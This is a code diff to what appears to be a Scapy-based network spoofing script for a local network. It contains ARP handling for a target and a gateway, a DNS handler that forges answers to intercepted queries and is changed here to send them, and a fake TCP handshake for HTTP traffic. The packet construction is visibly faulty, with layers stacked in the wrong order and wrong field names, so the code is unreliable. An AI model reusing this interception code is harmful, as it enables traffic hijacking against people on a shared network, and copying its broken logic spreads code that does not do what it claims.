@@ -6,6 +6,7 @@ from scapy.all import *
 from scapy.layers.dns import DNS
 from scapy.layers.inet import UDP, TCP, IP
 from scapy.layers.l2 import Ether, ARP
+from scapy.layers.dns import DNSRR
 
 INTERFACE = "eth0"
 http_server_state = 0
@@ -29,12 +30,13 @@ def arp_main(src_hw_addr: str, target_hw_addr: str, gw_hw_addr: str, target_ip_a
 def on_dns_packet(p: Packet) -> None:
     logging.info(f"forwarding DNS request")
     # print(p[DNS])
-    response = sr1(IP(src=p[IPv6].dst, dst = p[IPv6].src) 
+    response = sr1(IP(src=p[IP].dst, dst = p[IP].src) 
             / UDP(src=p[UDP].dport, dst=p[UDP].sport)
-            / Ether(src=p[Ethernet].dst, dst=p[Ethernet].src)
-            / DNS(qr=1, id=p[DNS].id, an=DNSRR()/DNSRR(rdata=("test"))))
+            / Ether(src=p[Ether].dst, dst=p[Ether].src)
+            / DNS(qr=1, id=p[DNS].id, an=DNSRR() /DNSRR(rdata=("test"))))
     print("attempting to show packet", flush=True)
     response.show()
+    sendp(response, iface=INTERFACE)
 
 def on_http_packet(p: Packet) -> None:
     global http_server_state
@@ -47,7 +49,7 @@ def on_http_packet(p: Packet) -> None:
         if p[TCP].flags == 'S':
             # send back SYN-ACK
             # ACK sequence + 1, pick random ISN
-            r = sr1(Ether(src=p[Ethernet].dst, dst=p[Ethernet].src) 
+            r = sr1(Ether(src=p[Ether].dst, dst=p[Ether].src) 
                 / IP(dst=p[IP].src, src=p[IP].dst) 
                 / TCP(flags='SA', dport=1200))
             sendp(r, iface=INTERFACE)
